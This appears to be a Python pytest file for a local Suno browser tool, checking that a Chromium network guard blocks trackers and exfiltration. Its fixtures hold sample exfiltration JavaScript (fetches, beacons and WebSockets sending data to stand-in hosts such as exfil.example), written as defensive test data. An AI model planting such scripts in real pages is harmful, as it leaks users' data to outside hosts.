"""Drives a real Chromium to prove the browser cannot reach hosts off the allowlist.

Skipped when no Playwright Chromium is installed (`uv run playwright install chromium`).
"""

import asyncio
import http.server
import socket
import sys
import tempfile
import threading
from pathlib import Path

import pytest
from playwright.async_api import async_playwright

from suno_local.browser import BrowserSession
from suno_local.config import Settings
from suno_local.netguard import AUDIT, BROWSER_CORE_HOSTS, BrowserGuard

# Every route a tracker or a malicious script would use to get data out of the page.
EXFIL_PAGE = """
<html><body><script>
  fetch('https://exfil.example/collect?d=secret').catch(() => {});
  fetch('https://93.184.216.34/collect').catch(() => {});
  new Image().src = 'https://pixel.example/p.gif';
  try { new WebSocket('wss://socket.example/ws'); } catch (e) {}
  const s = document.createElement('script'); s.src = 'https://www.googletagmanager.com/gtm.js';
  document.head.appendChild(s);
  fetch('https://studio-api.prod.suno.com/api/ping').catch(() => {});
</script></body></html>
"""


def _settings(tmp_path: Path) -> Settings:
    return Settings(
        profile_dir=tmp_path / "profile",
        download_dir=tmp_path / "music",
        headless=True,
        browser_channel=None,
        extra_hosts=(),
        debug=False,
    )


def _launch_or_skip(session):
    async def go():
        try:
            return await session.start_context()
        except Exception as exc:
            if "Executable doesn't exist" in str(exc):
                pytest.skip("Playwright Chromium is not installed")
            raise

    return go


def test_page_cannot_reach_off_list_hosts(tmp_path):
    session = BrowserSession(_settings(tmp_path))

    async def go():
        context = await _launch_or_skip(session)()
        try:
            page = await context.new_page()
            await page.set_content(EXFIL_PAGE)
            await asyncio.sleep(3)
        finally:
            await session.close()

    asyncio.run(go())
    snap = AUDIT.snapshot()
    blocked = {**snap["blocked"].get("browser", {}), **snap["blocked"].get("browser-ws", {})}
    for host in ["exfil.example", "93.184.216.34", "pixel.example",
                 "socket.example", "www.googletagmanager.com"]:
        assert host in blocked, f"{host} was not blocked: {snap}"
    assert "studio-api.prod.suno.com" in snap["allowed"].get("browser", {})


def _outbound_ip() -> str:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect(("192.0.2.1", 9))  # no packet is sent; this just picks an interface
        return probe.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        probe.close()


class _Sink(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def do_GET(self):
        _Sink.hits.append(self.path)
        self.send_response(204)
        self.end_headers()

    do_POST = do_GET

    def log_message(self, *args):
        pass


def _beacon_page(ip: str, port: int) -> str:
    base = f"http://{ip}:{port}"
    return f"""<script>
      navigator.sendBeacon('{base}/beacon', 'data');
      fetch('{base}/keepalive', {{method: 'POST', keepalive: true, body: 'x'}}).catch(() => {{}});
    </script>"""


def test_beacons_and_keepalive_cannot_leave(tmp_path):
    """Request interception alone misses these; the control run proves the leak is real."""
    ip = _outbound_ip()
    if ip.startswith("127."):
        pytest.skip("no non-loopback interface to test against")
    server = http.server.ThreadingHTTPServer(("0.0.0.0", 0), _Sink)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    page_html = _beacon_page(ip, server.server_address[1])

    async def control():
        # Interception only, no Chromium flags: what a Playwright-only guard would give you.
        async with async_playwright() as p:
            context = await p.chromium.launch_persistent_context(
                tempfile.mkdtemp(), headless=True, args=["--no-proxy-server"]
            )
            try:
                await BrowserGuard(BROWSER_CORE_HOSTS).attach(context)
                page = await context.new_page()
                await page.set_content(page_html)
                await asyncio.sleep(2)
            finally:
                await context.close()

    async def guarded():
        context = await _launch_or_skip(BrowserSession(_settings(tmp_path)))()
        try:
            page = await context.new_page()
            await page.set_content(page_html)
            await asyncio.sleep(2)
        finally:
            await context.close()

    try:
        _Sink.hits = []
        asyncio.run(guarded())
        guarded_hits = list(_Sink.hits)
        _Sink.hits = []
        asyncio.run(control())
        control_hits = list(_Sink.hits)
    finally:
        server.shutdown()

    assert sorted(control_hits) == ["/beacon", "/keepalive"], "control should leak; test is not measuring"
    assert guarded_hits == []


def test_hard_layers_block_even_without_interception(tmp_path):
    # Turn interception off and navigate: the Chromium flags alone must refuse the host,
    # even with a proxy set in the environment (the proxy flag overrides it).
    session = BrowserSession(_settings(tmp_path))

    async def go():
        context = await _launch_or_skip(session)()
        try:
            await context.unroute("**/*")
            page = await context.new_page()
            with pytest.raises(Exception) as err:
                await page.goto("https://exfil.example/", timeout=15000)
            return str(err.value)
        finally:
            await session.close()

    message = asyncio.run(go())
    assert "ERR_PROXY_CONNECTION_FAILED" in message or "ERR_NAME_NOT_RESOLVED" in message


@pytest.mark.skipif(sys.platform != "linux", reason="reads /proc")
def test_no_debug_port_is_opened(tmp_path):
    session = BrowserSession(_settings(tmp_path))
    marker = f"--user-data-dir={tmp_path / 'profile'}"

    async def go():
        await _launch_or_skip(session)()
        try:
            lines = []
            for cmdline in Path("/proc").glob("[0-9]*/cmdline"):
                try:
                    args = cmdline.read_bytes().split(b"\0")
                except OSError:
                    continue
                if marker.encode() in args:
                    lines.append([a.decode(errors="replace") for a in args])
            return lines
        finally:
            await session.close()

    procs = asyncio.run(go())
    assert procs, "could not find the browser process"
    browser = next(p for p in procs if not any(a.startswith("--type=") for a in p))
    assert "--remote-debugging-pipe" in browser
    assert not any(a.startswith("--remote-debugging-port") for a in browser)
    assert any(a.startswith("--host-resolver-rules=MAP * ~NOTFOUND") for a in browser)
    assert "--proxy-server=http://blocked.invalid:9" in browser
